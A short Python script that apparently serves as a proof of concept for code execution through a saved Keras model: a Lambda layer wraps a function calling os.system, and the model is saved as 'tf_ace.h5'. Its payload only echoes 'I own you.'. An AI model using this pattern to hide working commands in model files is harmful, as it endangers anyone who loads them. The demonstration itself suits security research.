import tensorflow as tf


def exec_(*args, **kwargs):
    import os

    os.system('echo "########################################\nI own you.\n########################################"')
    return 10


num_classes = 10
input_shape = (28, 28, 1)

model = tf.keras.Sequential([tf.keras.Input(shape=input_shape), tf.keras.layers.Lambda(exec_, name="custom")])


###
# model.compile(loss="categorical_crossentropy", optimizer="adam", metrics=["accuracy"])

model.save("tf_ace.h5")
###
